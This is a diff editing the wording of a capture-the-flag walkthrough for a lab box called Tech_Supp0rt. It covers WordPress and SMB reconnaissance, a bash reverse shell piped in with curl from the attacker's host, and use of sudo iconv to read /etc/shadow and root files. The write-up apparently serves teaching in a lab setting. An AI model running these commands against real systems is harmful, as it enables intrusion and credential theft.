@@ -129,9 +129,9 @@ Hmmm.., `/wordpress` seems interesting. Let's check it out!
 
 ![wordpress 404](/assets/Tech_Supp0rt/wordpress.png)
 
-We got a 404 page on it. Going over the website, we can see that most of the pages don't have anything useful in it, even looking through the source code doesn't get us any juicy recon. But, there are two pages named `BLOG` and `SAMPLE PAGE` which have some interesting things to look into. </br>
+We got a 404 page on it. Going over the website, we can see that most of the pages don't have anything useful in it, even looking through the source code doesn't get us any juicy recon. But, there are two pages named `BLOG` and `SAMPLE PAGE` which have some interesting things to look into.
 
-Firstly, through the `BLOG` page, we get author's name which is `support`. This might come in handy later on.. who knows. </br>
+Firstly, through the `BLOG` page, we get author's name which is `support`. This might come in handy later on.. who knows.
 
 Through the `SAMPLE PAGE` page, we have a link to `your dashboard`. The interesting thing here is, when we click on this link we get landed on `http://10.0.2.15/wordpress/wp-admin/`. Notice, here the ip is changed. So, following the same pattern, we manually type `http://10.10.164.212/wordpress/wp-admin/` and voila, we have the wp-login page.
 
@@ -380,7 +380,7 @@ smbmap -H 10.10.164.212
         websvr                                                  READ ONLY
         IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))
 ```
-We get to know that this `websvr` can be read by us. So now, we'll be using smbclient.
+We get to know that this `websvr` can be read by us. So, we'll be using smbclient.
 
 ### smbclient
 
@@ -399,7 +399,7 @@ smb: \> ls
 smb: \> get enter.txt
 getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
 ```
-We got an `enter.txt` file. Now, let us take a look into it!
+We got an `enter.txt` file. Let us take a look into it!
 
 ```bash
 cat enter.txt   
@@ -429,7 +429,7 @@ Manually entering `10.10.164.212/subrion/`, we get redirected to `https://10.0.2
 
 ![subrion panel](/assets/Tech_Supp0rt/subrion-panel.png)
 
-We are interested in `/panel`. We already have an username, and we need to get a password through [CyberChef](https://gchq.github.io/CyberChef/).
+We are interested in `/panel`. We already have an username, and we need to get the password through [CyberChef](https://gchq.github.io/CyberChef/).
 
 ![cyberchef password decode](/assets/Tech_Supp0rt/cyberchef-password.png)
 
@@ -498,9 +498,9 @@ www-data
 ```
 ### Reverse Shell
 
-Now, we'll be getting a reverse shell. I wrote this simple reverse shell payload for this purpose `bash -i >& /dev/tcp/10.9.2.90/1234 0>&1`, save this payload in a .sh extension file. We will now start a simple http server `python3 -m http.server 8080` and start a netcat listener `nc -lvnp 1234` in a new terminal tab. </br>
+We'll be getting a reverse shell. I wrote this simple reverse shell payload for this purpose `bash -i >& /dev/tcp/10.9.2.90/1234 0>&1`, save this payload in a .sh extension file. We will now start a simple http server `python3 -m http.server 8080` and start a netcat listener `nc -lvnp 1234` in a new terminal tab.
 
-Now, on the victim box, we'll be using curl `curl http://10.9.2.90:8080/shell.sh | bash`. </br>
+Now, on the victim box, we'll be using curl `curl http://10.9.2.90:8080/shell.sh | bash`.
 
 > curl tries to display the file contents in the shell so to take advantage of this we piped this to bash so that our payload could run. We did not use wget because it was giving a hard time in running.
 {: .prompt-info }
@@ -606,7 +606,7 @@ Yes! We got in! Now it's time for some privelege escalation!!
 
 ## Privelege Escalation
 
-Now, either we can upload linpeas or we can do some manual work ourselves. I tried both methods, linpeas was taking much time so I skipped it. </br>
+We can do two things here either we can upload linpeas or we can do some manual work ourselves. I tried both methods, linpeas was taking much time so I skipped it.
 
 In the shell, run `sudo -l` to get to know whether this user can run root level commands without knowing the password or not. For more amazing material, please refer to [PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#sudo)
 
@@ -620,9 +620,9 @@ Matching Defaults entries for scamsite on TechSupport:
 User scamsite may run the following commands on TechSupport:
     (ALL) NOPASSWD: /usr/bin/iconv
 ```
-This `iconv` binary can be exploited to read root level files. Like `/etc/shadow` or if we want to get lazyy we can directly read `/root/root.txt`. NICE!! </br>
+This `iconv` binary can be exploited to read root level files. Like `/etc/shadow` or if we want to get lazyy we can directly read `/root/root.txt`. NICE!!
 
-[GTFOBins](https://gtfobins.github.io/gtfobins/iconv/). First, let us read the shadow file.
+Do refer [GTFOBins](https://gtfobins.github.io/gtfobins/iconv/). First, let us read the shadow file.
 
 ```bash
 scamsite@TechSupport:/$ LFILE=/etc/shadow
@@ -728,6 +728,6 @@ root@TechSupport:~# cat root.txt
 redacted
 root@TechSupport:~# 
 ```
-That's it folks, this was all about the Tech_Support box.</br>
+That's it folks, this was all about the Tech_Support box.
 
 Thank you so much for being till the end. See you guys next time...!
